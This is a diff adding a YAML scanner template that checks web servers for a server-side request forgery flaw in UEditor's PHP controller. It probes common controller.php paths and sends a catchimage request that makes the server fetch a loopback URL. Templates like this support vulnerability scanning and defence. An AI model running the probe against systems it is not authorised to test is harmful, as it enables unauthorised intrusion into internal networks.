@@ -1,0 +1,30 @@
+id: poc-yaml-ueditor-php-ssrf
+info:
+  name: UEditor PHP SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: UEditor
+  osprey-id: vb_2020_0033
+variables:
+  r_path: '/ueditor/php/controller.php
+
+    /Public/ueditor/php/controller.php
+
+    /js/ueditor/php/controller.php
+
+    /module/ueditor/php/controller.php'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  expression: 'contains(body, "{\"state\":\"\\u8bf7\\u6c42\\u5730\\u5740\\u51fa\\u9519\"}")
+    && !contains(body, "<")
+
+    '
+- method: GET
+  path: '{{.r_path}}?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png'
+  expression: 'contains(body, "\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528") && !contains(body,
+    "<")
+
+    '
+transport: http
